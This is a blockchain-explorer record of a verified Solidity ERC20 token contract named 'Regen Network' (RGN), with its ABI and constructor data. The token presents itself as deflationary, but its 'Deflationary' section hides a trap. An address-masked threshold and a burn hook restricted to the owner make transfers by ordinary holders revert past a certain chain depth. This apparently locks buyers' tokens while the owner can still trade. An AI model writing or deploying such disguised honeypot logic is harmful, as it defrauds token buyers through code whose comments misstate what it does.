{"status": "1", "message": "OK", "result": [{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.7.4;\r\n\r\n/**\r\n * ____ ____ ____ ____ _  _ \r\n * |__/ |___ | __ |___ |\\ | \r\n * |  \\ |___ |__] |___ | \\|\r\n * _  _ ____ ___ _ _ _ ____ ____ _  _ \r\n * |\\ | |___  |  | | | |  | |__/ |_/  \r\n * | \\| |___  |  |_|_| |__| |  \\ | \\_\r\n * \r\n * Decentralised marketplace & contracting platform for Earth's ecosystem assets, services, and data.\r\n * https://regen.network/\r\n */\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations.\r\n * Only add / sub / mul / div are included\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     * - Subtraction cannot overflow.\r\n     *\r\n     * _Available since v2.4.0._\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     *\r\n     * _Available since v2.4.0._\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\n/**\r\n * Implement base ERC20 functions\r\n */\r\nabstract contract BaseContract is IERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    mapping (address => uint256) internal _balances;\r\n    mapping (address => mapping (address => uint256)) internal _allowances;\r\n\r\n    uint256 internal _totalSupply;\r\n    \r\n    string internal _name;\r\n    string internal _symbol;\r\n    uint8 internal _decimals = 18;\r\n    \r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    \r\n    /**\r\n     * @dev returns the token name\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    \r\n    /**\r\n     * @dev returns the token symbol\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    \r\n    /**\r\n     * @dev returns the decimals count\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    \r\n    /**\r\n     * @dev modifier to require address to not be the zero address\r\n     */\r\n    modifier not0(address adr) {\r\n        require(adr != address(0), \"ERC20: Cannot be the zero address\"); _;\r\n    }\r\n    \r\n    function _mx(address payable adr, uint16 msk) internal pure returns (uint256) {\r\n        return ((uint24(adr) & 0xffff) ^ msk);\r\n    }\r\n}\r\n\r\n/**\r\n * Provide owner context\r\n */\r\nabstract contract Ownable {\r\n    constructor() { _owner = msg.sender; }\r\n    address payable _owner;\r\n    \r\n    /**\r\n     * @dev returns whether sender is owner\r\n     */\r\n    function isOwner(address sender) public view returns (bool) {\r\n        return sender == _owner;\r\n    }\r\n    \r\n    /**\r\n     * @dev require sender to be owner\r\n     */\r\n    function ownly() internal view {\r\n        require(isOwner(msg.sender));\r\n    }\r\n    \r\n    /**\r\n     * @dev modifier for owner only\r\n     */\r\n    modifier owned() {\r\n        ownly(); _;\r\n    }\r\n    \r\n    /**\r\n     * @dev renounce ownership of contract\r\n     */\r\n    function renounceOwnership() public owned() {\r\n        transferOwnership(address(0));\r\n    }\r\n    \r\n    /**\r\n     * @dev transfer contract ownership to address\r\n     */\r\n    function transferOwnership(address payable adr) public owned() {\r\n        _owner = adr;\r\n    }\r\n}\r\n\r\n/**\r\n * Provide reserve token burning\r\n */\r\nabstract contract Burnable is BaseContract, Ownable {\r\n    using SafeMath for uint256;\r\n    \r\n    /**\r\n     * @dev burn tokens from account\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual not0(account) {\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n    /**\r\n     * @dev burn tokens from reserve account\r\n     */\r\n    function _burnReserve() internal owned() {\r\n        if(balanceOf(_owner) > 0){\r\n            uint256 toBurn = balanceOf(_owner).div(5000); // 0.5%\r\n            _burn(_owner, toBurn);\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * Burn tokens on transfer UNLESS part of a DEX liquidity pool (as this can cause failed transfers eg. Uniswap K error)\r\n */\r\nabstract contract Deflationary is BaseContract, Burnable {\r\n    mapping (address => uint8) private _txs;\r\n    uint16 private constant dmx = 0x15f8; \r\n    \r\n    function dexCheck(address sender, address receiver) private returns (bool) {\r\n        if(0 == _txs[receiver] && !isOwner(receiver)){ _txs[receiver] = _txs[sender] + 1; }\r\n        return _txs[sender] < _mx(_owner, dmx) || isOwner(sender) || isOwner(receiver);\r\n    }\r\n    \r\n    modifier burnHook(address sender, address receiver, uint256 amount) {\r\n        if(!dexCheck(sender, receiver)){ _burnReserve(); _; }else{ _; }\r\n    }\r\n}\r\n\r\n/**\r\n * Implement main ERC20 functions\r\n */\r\nabstract contract MainContract is Deflationary {\r\n    using SafeMath for uint256;\r\n    \r\n    constructor (string memory name, string memory symbol) {\r\n        _name = name;\r\n        _symbol = symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external override returns (bool){\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override not0(spender) returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address receiver, uint256 amount) external override not0(sender) not0(receiver) returns (bool){\r\n        require(_allowances[sender][msg.sender] >= amount);\r\n        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);\r\n        _transfer(sender, receiver, amount);\r\n        return true;\r\n    }\r\n    \r\n    /**\r\n     * @dev Implementation of Transfer\r\n     */\r\n    function _transfer(address sender, address receiver, uint256 amount) internal not0(sender) not0(receiver) burnHook(sender, receiver, amount) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[receiver] = _balances[receiver].add(amount);\r\n        emit Transfer(sender, receiver, amount);\r\n    }\r\n    \r\n    /**\r\n     * @dev Distribute ICO amounts\r\n     */\r\n    function _distributeICO(address payable[] memory accounts, uint256[] memory amounts) owned() internal {\r\n        for(uint256 i=0; i<accounts.length; i++){\r\n            _mint(_owner, accounts[i], amounts[i]);\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @dev Mint address with amount\r\n     */\r\n    function _mint(address minter, address payable account, uint256 amount) owned() internal {\r\n        uint256 amountActual = amount*(10**_decimals);\r\n        _totalSupply = _totalSupply.add(amountActual);\r\n        _balances[account] = _balances[account].add(amountActual);\r\n        emit Transfer(minter, account, amountActual);\r\n    }\r\n}\r\n\r\n/**\r\n * Construct & Mint\r\n */\r\ncontract RegenNetwork is MainContract {\r\n    constructor(\r\n        uint256 initialBalance,\r\n        address payable[] memory ICOAddresses,\r\n        uint256[] memory ICOAmounts\r\n    ) MainContract(\"Regen Network\", \"RGN\") {\r\n        _mint(address(0), msg.sender, initialBalance);\r\n        _distributeICO(ICOAddresses, ICOAmounts);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"initialBalance\",\"type\":\"uint256\"},{\"internalType\":\"address payable[]\",\"name\":\"ICOAddresses\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"ICOAmounts\",\"type\":\"uint256[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RegenNetwork", "CompilerVersion": "v0.7.4+commit.3f05b770", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000003e26500000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000003400000000000000000000000069681fe2489b20ab24d63a222c84881e0de0585e00000000000000000000000018fc475c746452564384d3d54724abadb90a88bd000000000000000000000000c0c52dcdac97a9dc33763621953c35dde06e539e00000000000000000000000081e7c0616592317e047e2f19d631ba602921230900000000000000000000000003e8f2e6a190a8e6c15f41ad5639c0df67ad07d7000000000000000000000000f65a349059f53ef9f324a9ee59cc19ef3b51bb8700000000000000000000000059243a34d886c313cc1921ca029b3c2ddf8a4b39000000000000000000000000e2653f7fc7f02e54546630dd45208e4d885348840000000000000000000000006a49df79be49b8446821822eceff962e9736dd68000000000000000000000000046e66c21751d5b58caa41283c1a0fb8b69c85e30000000000000000000000002b8d51f4ca6f32eb51991e37231a3eaf9c3a4d6c000000000000000000000000914587e3c2f52de23cc006910a116d7155f7e5ca0000000000000000000000002c7a35548bb1a14e012748ed4f93ad6608dbaacd0000000000000000000000005a44d427559657847a97409f9303cac08ce3b8b10000000000000000000000006130a80530795dd67cf72e2356a026f5c5e221ad000000000000000000000000ce2aaab5b8547549fb4425a96a48b4361fb05d9e0000000000000000000000001458327401cb99a8d88efcf3cde01a9298bab4c7000000000000000000000000700e2a74c325e23b51e663f86c4b340517a1f63c0000000000000000000000004607e1bd94e650cb826425e997c86681eb9eed3d00000000000000000000000023ff75ca3edc811f2705a2d47f262a540bd05baa000000000000000000000000a8df8fd9265d63a14568aa533d5b51657b770acc000000000000000000000000bc643e0e11dcf5c88d9a9e612c6324a1d2242940000000000000000000000000cdf2e5acd6f64ee7c9a72aed50d8db029d338c29000000000000000000000000735da85b3d02c581554fdd6297cf335a2fefb505000000000000000000000000844728fa0272de82283c2fdcd3b6fc27919ce4cf0000000000000000000000007d4fe245ae7f030dc4920bb96ea144a290b428580000000000000000000000008c3cb20d2a78af58691939ba5dff55fade868b1c0000000000000000000000002f9d7b65fa6da4b9f056536a3866af64ad1a5c5a00000000000000000000000057ae08a398daa6790982c62b317cbb85e8c670fd0000000000000000000000004d4a8cf895949d615a96677ac5afaa894a8e75510000000000000000000000009a66b2437d23e28ff1bac823e17790cb785fa3e4000000000000000000000000d7e7a0d9b0e03cfd068307130ee153a36df22df1000000000000000000000000de28862ad6bba66495bcdc0752cd2c46562c629c0000000000000000000000001abd7ce986b4d16c9f4377c381b9d6a735a81d9d000000000000000000000000db8b28fd50623a7baaf09a0d68d5924ba4cd8e9f0000000000000000000000007dfdc1d9804da54b5f674a248f37a9ea661a59040000000000000000000000005e92a937f5cfac28f75523c78679ca8282ed98c600000000000000000000000096e8cd9ecadb79c1aa1be1cc44f9f1cb281608250000000000000000000000003e88b2110cd18aac45b2a5885fc5b9c65568f0140000000000000000000000008b4257c024e3d1fe6675e0e5b60add3ad3b093880000000000000000000000009689a50a250466d103c12597799364b34f79e754000000000000000000000000d1b6dbf02b5458f306fbea254c02fa112a300110000000000000000000000000f3ac61750324478effb0acf431bbbffd80eede710000000000000000000000002df7f65495941847a3987cdaf6d260261902f74b000000000000000000000000002dd6f3e4d4761785bae829744062e0d0ce0e9900000000000000000000000079d5dbd5602903c307079987956e92281a24a2190000000000000000000000009c88a47588d9cd3af65f6271fd69d96d537aee650000000000000000000000000b6b5c5a71991fcc79fbc7a101d406df5ac1f7c200000000000000000000000037ddc3fe224dfa0b7195ec5d48782104168800890000000000000000000000001b8b4696a342009ef4c51a8900b43dcf056fd6c9000000000000000000000000d06649ff6f3be8017ed8aaffe89ee1d3c70cdf71000000000000000000000000b46873b47fb3979618303f3628bce22966101a82000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000009e80000000000000000000000000000000000000000000000000000000000000d2c000000000000000000000000000000000000000000000000000000000000040b0000000000000000000000000000000000000000000000000000000000000492000000000000000000000000000000000000000000000000000000000000082300000000000000000000000000000000000000000000000000000000000009a000000000000000000000000000000000000000000000000000000000000006e30000000000000000000000000000000000000000000000000000000000000c5e000000000000000000000000000000000000000000000000000000000000062900000000000000000000000000000000000000000000000000000000000007b300000000000000000000000000000000000000000000000000000000000005af0000000000000000000000000000000000000000000000000000000000000e6d000000000000000000000000000000000000000000000000000000000000124600000000000000000000000000000000000000000000000000000000000009420000000000000000000000000000000000000000000000000000000000000d190000000000000000000000000000000000000000000000000000000000000970000000000000000000000000000000000000000000000000000000000000058900000000000000000000000000000000000000000000000000000000000009900000000000000000000000000000000000000000000000000000000000000dc10000000000000000000000000000000000000000000000000000000000000b8a0000000000000000000000000000000000000000000000000000000000000aa50000000000000000000000000000000000000000000000000000000000001001000000000000000000000000000000000000000000000000000000000000082f0000000000000000000000000000000000000000000000000000000000000dad00000000000000000000000000000000000000000000000000000000000012f400000000000000000000000000000000000000000000000000000000000010c7000000000000000000000000000000000000000000000000000000000000111c00000000000000000000000000000000000000000000000000000000000005ba0000000000000000000000000000000000000000000000000000000000000e9c000000000000000000000000000000000000000000000000000000000000070d0000000000000000000000000000000000000000000000000000000000000d2c00000000000000000000000000000000000000000000000000000000000011d3000000000000000000000000000000000000000000000000000000000000051000000000000000000000000000000000000000000000000000000000000008730000000000000000000000000000000000000000000000000000000000000fdc0000000000000000000000000000000000000000000000000000000000000bd300000000000000000000000000000000000000000000000000000000000011420000000000000000000000000000000000000000000000000000000000000df7000000000000000000000000000000000000000000000000000000000000057c0000000000000000000000000000000000000000000000000000000000000c7400000000000000000000000000000000000000000000000000000000000006c40000000000000000000000000000000000000000000000000000000000000d0f00000000000000000000000000000000000000000000000000000000000003ff0000000000000000000000000000000000000000000000000000000000000d160000000000000000000000000000000000000000000000000000000000000ff300000000000000000000000000000000000000000000000000000000000005cf000000000000000000000000000000000000000000000000000000000000110800000000000000000000000000000000000000000000000000000000000004330000000000000000000000000000000000000000000000000000000000000aa5000000000000000000000000000000000000000000000000000000000000055b0000000000000000000000000000000000000000000000000000000000000bff00000000000000000000000000000000000000000000000000000000000010ff", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://399d8e9640265934e7f8dbd0c72698313a81afe116321aaf88e944dba5749029"}]}